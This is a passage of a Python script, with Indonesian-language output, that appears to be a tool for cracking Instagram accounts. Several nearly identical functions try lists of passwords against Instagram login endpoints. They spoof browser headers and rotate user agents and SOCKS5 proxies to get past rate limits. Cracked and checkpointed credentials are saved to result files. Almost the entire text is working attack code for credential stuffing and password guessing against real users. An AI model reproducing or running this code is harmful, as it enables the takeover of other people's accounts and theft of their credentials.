			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan

	def iya(self):
	    rr = random.randint
	    return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)")


	def asynchronous1(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = ua_ku()
		sys.stdout.write(f'\r {H}lupine {P}{loop}/{len(internal)}{P} live:-{H}{len(success)} {P}checkpoint:-{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				evos=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
				head = {
                    'Host': 'i.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '314',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-WWW-Claim': '0',
                    'sec-ch-ua-mobile': '?1',
                    'X-Instagram-AJAX': '8a5016770d5c',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'Origin': 'https://www.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://www.instagram.com/',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon=ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				evos=json.loads(respon.text)
				if 'userId' in str(evos):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold green]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(evos):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold yellow]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					sys.stdout.write(f'\r {M}ip pada kartu anda terkena spam mode   ');sys.stdout.flush()
					time.sleep(10)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
			
	def asynchronous2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = ua_ku()
		sys.stdout.write(f'\r {H}lupine {P}{loop}/{len(internal)}{P} live:-{H}{len(success)} {P}checkpoint:-{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				evos=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://www.secure.instagram.com/accounts/login/ajax/')
				head = {
                    'Host': 'www.secure.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '397',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-WWW-Claim': '0',
                    'sec-ch-ua-mobile': '?1',
                    'X-Instagram-AJAX': 'a5239aee191e',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 10; zh-CN MZ-MEIZU 18 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4628.132 HeyTapBrowser/9.20.1 Mobile safari/537.36', 
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'Origin': 'https://www.secure.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://www.secure.instagram.com/accounts/onetap/',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon=ses.post("https://www.secure.instagram.com/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				evos=json.loads(respon.text)
				if 'userId' in str(evos):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold green]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(evos):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold yellow]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					sys.stdout.write(f'\r {M}ip pada kartu anda terkena spam mode   ');sys.stdout.flush()
					time.sleep(10)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)

	def api(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		ua = self.ua_ig()
		sys.stdout.write(f'\r {H}lupine {P}{loop}/{len(internal)}{P} live:-{H}{len(success)} {P}checkpoint:-{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				evos = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en')
				head = {
                    'Host': 'z-p42.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '323',
                    'X-IG-WWW-Claim': '0',
                    'X-Instagram-AJAX': '31ece3091cee',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'X-IG-App-ID': '1217981644879628',
                    'Origin': 'https://z-p42.www.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://z-p42.www.instagram.com/',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				    "username":user,
				    "queryParams":"{}",
				    "optIntoOneTap":"false",
				    "stopDeletionNonce":"",
				    "trustedDeviceRecords":"{}"
				    }
				respon=ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", headers = head, data = data)
				rrq=json.loads(respon.text)
				if "userId" in str(rrq) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold green]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					lag = []
					lag.append(Panel(f'[italic bold green]{user_agentAPI()}',width=70,style="{rich_gelap}"))
					lupine_id.print(Columns(lag))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(rrq):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold yellow]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r {M}ip pada kartu anda terkena spam mode   ');sys.stdout.flush()
					time.sleep(10)
					self.crackAPIversi2(user,pas)

				else:
					continue
			loop+=1
		except:
			self.api(user,pas)
	
	def force(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		ua = self.ua_ig()
		sys.stdout.write(f'\r {H}lupine {P}{loop}/{len(internal)}{P} live:-{H}{len(success)} {P}checkpoint:-{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				evos = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://z-p3.www.instagram.com/accounts/login/?force_classic_login&hl=en')
				head = {
                    'Host': 'z-p3.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '316',
                    'X-IG-WWW-Claim': '0',
                    'X-Instagram-AJAX': '31ece3091cee',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'X-IG-App-ID': '1217981644879628',
                    'Origin': 'https://z-p3.www.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://z-p3.www.instagram.com/accounts/login/',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				    "username":user,
				    "queryParams":"{}",
				    "optIntoOneTap":"false",
				    "stopDeletionNonce":"",
				    "trustedDeviceRecords":"{}"
				    }
				respon=ses.post("https://z-p3.www.instagram.com/accounts/login/ajax/",headers = head, data = data)
				rrq=json.loads(respon.text)
				if "userId" in str(rrq) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold green]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					lag = []
					lag.append(Panel(f'[italic bold green]{user_agentAPI()}',width=70,style="{rich_gelap}"))
					lupine_id.print(Columns(lag))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(rrq):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r									")
					ling = []
					ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
					ling.append(Panel(f'[italic][bold white] memiliki [bold yellow]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
					lupine_id.print(Columns(ling))
					lupi = []
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
					lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r {M}ip pada kartu anda terkena spam mode   ');sys.stdout.flush()
					time.sleep(10)
					self.crackAJAX(user,pas)

				else:
					continue
			loop+=1
		except:
			self.force(user,pas)
	
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			lupine = random.randint(1000000000, 99999999999)
			ses = requests.Session()
			ts = calendar.timegm(current_GMT)
			sys.stdout.write(f'\r{P}pengecekan akun -> {P}{usr}{P}');sys.stdout.flush()
			response = ses.get(f"https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en").text
			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
			head = {
                    'Host': 'z-p42.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '296',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
                    'Origin': 'https://z-p42.www.instagram.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'X-Requested-With': 'mark.via.gp',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
			param={
					'csrfmiddlewaretoken': token,
					'username': usr,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}'
					}
			respon=ses.post("https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en", headers = head, data = param, allow_redirects=True)
			if "userId" in str(respon.text) or "sessionid" in ses.cookies.get_dict():
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				ling = []
				ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
				ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
				ling.append(Panel(f'[italic][bold white] memiliki [bold green]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
				lupine_id.print(Columns(ling))
				lupi = []
				lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
				lupi.append(Panel(f'[italic][bold white]   memiliki [bold green]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				ling = []
				ling.append(Panel(f'[italic][bold white] {user}',width=22,style=f"{rich_gelap}"))
				ling.append(Panel(f'[italic][bold white] {pw}',width=23,style=f"{rich_gelap}"))
				ling.append(Panel(f'[italic][bold white] memiliki [bold yellow]{postingan} [bold white]post',width=23,style=f"{rich_gelap}"))
				lupine_id.print(Columns(ling))
				lupi = []
				lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{pengikut} [bold white]pengikut',width=34,style=f"{rich_gelap}"))
				lupi.append(Panel(f'[italic][bold white]   memiliki [bold yellow]{mengikut} [bold white]mengikuti',width=35,style=f"{rich_gelap}"))
				lupine_id.print(Columns(lupi))
				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'ip_block' in str(respon.text):
				sys.stdout.write(f'\r {P}ip pada kartu anda terkena spam {P}{len(usr)}{P}');sys.stdout.flush()
				time.sleep(5)
				self.checkAPI(usr, pwd)
		except:
			self.checkAPI(usr,pwd)



if __name__=='__main__':
	into_log()
